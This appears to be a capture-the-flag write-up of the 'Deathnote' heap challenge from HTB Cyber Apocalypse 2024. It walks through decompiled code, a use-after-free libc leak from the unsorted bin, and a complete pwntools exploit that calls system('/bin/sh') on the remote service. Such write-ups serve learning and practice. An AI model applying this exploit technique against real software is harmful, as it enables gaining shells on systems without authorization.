---
title: HTB - Cyber Apocalypse 2024 - Pwn - Deathnote
date: '2024-03-14'
tags: ['pwn', 'htb', 'cyber-apocalypse', 'heap', 'unsorted-bin']
draft: false
summary: Utilizing unsorted bin to get a libc leak and calling system with user-controlled heap-chunk's data.
---

## Challenge Description

![alt text](/static/writeups/htb-cyberapocalypse/image.png)

## Solution

Deathnote was a medium pwn challenge and involved utilizing a freed chunk that was stored in the unsorted bin to get a libc leak, and then it had a special function that we could invoke using `42`, that would simply run the function stored in chunk[0] and it would take chunk[1] as it's argument.

Now, to begin with, we were provided with `libc` and `ld` and the binary was already patched to point to those so in case we got leaks, we wouldn't have to worry about misalignment issues.

So, let's start by first analyzing the binary in ghidra:

> For ease of reading and understanding, I rename my variable in Ghidra

![alt text](/static/writeups/htb-cyberapocalypse/image-5.png)

Okay, we can see that the main login works as follows in pseudocode:

```c:pseudocode
while(true) {
    switch(menu()) {
        case 42:
            _(&buffer); break;
        case 1:
            add(&buffer); break;
        case 2:
            delete(&buffer); break;
        case 3:
            show(&buffer); break;
        default:
            continue;
    }
}
```

Now, let's start with `_` function that would be invoked if we enter `42`:

```c:_
void _(char **param_1)

{
  long lVar1;
  code *idx0;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\x1b[1;33m");
  cls();
  printf(s__%s_%s_%s_%s_%s_00102750,"\x1b[1;31m","\x1b[1;33m","\x1b[1;31m","\x1b[1;33m","\x1b[1;36m"
        );
  idx0 = (code *)strtoull(*param_1,(char **)0x0,0x10);
  if (((idx0 == (code *)0x0) && (**param_1 != '0')) && ((*param_1)[1] != 'x')) {
    puts("Error: Invalid hexadecimal string");
  }
  else {
    if ((*param_1 == (char *)0x0) || (param_1[1] == (char *)0x0)) {
      error("What you are trying to do is unacceptable!\n");
                    /* WARNING: Subroutine does not return */
      exit(0x520);
    }
    puts(s__[!]_Executing_!_00102848);
    (*idx0)(param_1[1]);
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Now, this function may seem daunting at first but to get the gist of it, it's doing the following:

- Checks if passed buffer's 0th index element contains a valid `unsigned long long` (an address can pass this check).
- `(*idx0)(param_1[1])` will simply execute this data, and pass the `1st` parameter as its argument.

So we know, we can execute a function, let's see what `buffer` is, that is being passed to the function.

Looking at the decompilation, we can assume that buffer is a `2-D` array. Let's look at the `add` function to understand more about this functionality

```c:add
void add(long param_1)

{
  long lVar1;
  byte idx;
  char is_valid_idx;
  long len;
  void *buffer;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  get_empty_note(param_1);
  printf(&DAT_00102658);
  len._0_2_ = read_num();
  if (((ushort)len < 2) || (128 < (ushort)len)) {
    error("Don\'t play with me!\n");
  }
  else {
    printf(s__Page?_0010268e);
    idx = read_num();
    is_valid_idx = check_idx(idx);
    if (is_valid_idx == '\x01') {
      buffer = malloc((ulong)(ushort)len);
      *(void **)((ulong)idx * 8 + param_1) = buffer;
      printf(s__Name_of_victim:_0010269c);
      read(0,*(void **)(param_1 + (ulong)idx * 8),(long)(int)((ushort)len - 1));
      printf("%s\n[!] The fate of the victim has been sealed!%s\n\n","\x1b[1;33m","\x1b[1;36m");
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Now, the first thing that it does is invoke another function called `get_empty_note`, that will simply and literally, `get` an empty note. Then, it will ensure that the we can only write data in the range `(3 <= len <= 127)`. Then, it asks the user for an index in the array where it should store the `note`, and if a valid index is provided, it will allocate a chunk of `len` size, and then simply read data into it.

Let's analyze the `delete` function:

```c:delete

void delete(long param_1)

{
  long lVar1;
  byte idx;
  char cVar2;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf(s__Page?_0010268e);
  idx = read_num();
  cVar2 = check_idx(idx);
  if (cVar2 == '\x01') {
    if (*(long *)(param_1 + (ulong)idx * 8) == 0) {
      error("Page is already empty!\n");
    }
    else {
      printf("%s\nRemoving page [%d]\n\n%s","\x1b[1;32m",(ulong)idx,"\x1b[1;36m");
    }
    free(*(void **)(param_1 + (ulong)idx * 8));
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Now, this function is pretty self explanatory;

- Asks the user for input
- Frees the chunk at the index; if index is valid.

The last function is `show`, let's take a look at that:

```c:show
void show(long param_1)

{
  long lVar1;
  byte bVar2;
  char cVar3;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf(s__Page?_0010268e);
  bVar2 = read_num();
  cVar3 = check_idx(bVar2);
  if (cVar3 == '\x01') {
    if (*(long *)(param_1 + (ulong)bVar2 * 8) == 0) {
      error("Page is empty!\n");
    }
    else {
      printf("\nPage content: %s\n",*(undefined8 *)(param_1 + (ulong)bVar2 * 8));
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

This function can be used to get a leak because this function simply dereferences an array index; which is a chunk.

### Exploitation Path

The exploitation path is pretty simple, we can do the following:

- Fill tcache by allocating memory
- Allocate a chunk of the same size and then free it so it goes to the unsorted bin
- The chunk in the unsorted bin will contain a libc address, so we have a leak
- Write system to chunk 0, `/bin/sh` to chunk 1
- Invoke `42` and win.

To make things easier, I wrote the following function wrappers:

```py:exploit.py
def alloc(sz, page, data):
    io.sendline(b"1")
    io.sendlineafter(b"request?", encode(sz))
    io.sendlineafter(b"Page?", encode(page))
    io.sendafter(b"victim:", encode(data))
    io.recvlines(5) # clean the stdout

    def free(page):
    io.sendline(b"2")
    io.sendlineafter(b"Page?", encode(page))
    io.recvlines(5)

def show(page):
    io.sendline(b"3")
    io.sendlineafter(b"Page?", encode(page))
    io.recvuntil(b"Page content: ")
    return io.recvline()
```

Now, one question that I had in mind, `what size chunk should I allocate?`, well. We know that fastbins can hold `0x16, 24, 32, 40, 48, 56, 64, 72, 80, and 88 bytes` of chunk, also, if we recall the `add` function, we can create a chunk of max size `127`, so; what if we create a `127` sized chunk. So, the basic exploit for this will be as follows:

```py:exploit.py
# fill tcache
for i in range(10): alloc(0x7f, i, "ashfaq-the-goat")
for i in range(7): free(i)
```

What this will do; is allocate `10` elements, and then free `0x7` of those, so that the tcache for `0x7f` is full, if we analyze bins in gdb, we can see:

![alt text](/static/writeups/htb-cyberapocalypse/image-6.png)

Now we'll free `chunk 7`, and when we show that chunk, we'll see that we have a leak of libc:

![alt text](/static/writeups/htb-cyberapocalypse/image-7.png)

We'll parse and clean the input as follows:

```py:exploit.py
# get libc-leak from unsorted-bin
free(7)
leak = show(7)
libc_leak = fixleak(leak)

info("got libc leak @  %#x" % libc_leak)
```

Let's analyze and find the offset of this leak in gdb:

![alt text](/static/writeups/htb-cyberapocalypse/image-8.png)

![alt text](/static/writeups/htb-cyberapocalypse/image-9.png)

We can see that offset of this leak from the base is: `0x21ace0`. Now, the last thing we need to do is:

- Write address of libc.system to the `0th` index
- Write `"/bin/sh"` to `1st` index so that when `(*idx0)(param_1[1])` invoked, we get a `system("/bin/sh")`

The final exploit is:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./deathnote"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *main\nb *_+140\nb *_+299")

def alloc(sz, page, data, ln=False):
    io.sendline(b"1")
    io.sendlineafter(b"request?", encode(sz))
    io.sendlineafter(b"Page?", encode(page))
    if ln: io.sendlineafter(b"victim:", encode(data))
    else: io.sendafter(b"victim:", encode(data))
    io.recvlines(5) # clean the stdout

def free(page):
    io.sendline(b"2")
    io.sendlineafter(b"Page?", encode(page))
    io.recvlines(5)

def show(page):
    io.sendline(b"3")
    io.sendlineafter(b"Page?", encode(page))
    io.recvuntil(b"Page content: ")
    return io.recvline()

# fill tcache
for i in range(10): alloc(0x7f, i, "ashfaq-the-goat")
for i in range(7): free(i)

# get libc-leak from unsorted-bin
free(7)
leak = show(7)
libc_leak = fixleak(leak)

info("got libc leak @  %#x" % libc_leak)
libc.address = libc_leak - 0x21ace0
info("libc-base @ %#x" % libc.address)

# Since we control the argument passed, we can easily write "/bin/sh"
# And 0th index is executed, so win win.
alloc(0x7f, 0, hex(libc.sym.system))
alloc(0x7f, 1, b"/bin/sh\x00")

# # invoke the calling function
io.sendline(b"42")

io.interactive()
```

Running this against the remote and getting the flag:

![alt text](/static/writeups/htb-cyberapocalypse/image-10.png)

Overall, this challenge was rated medium but it was pretty simple and required just simple knowledge of the heap.
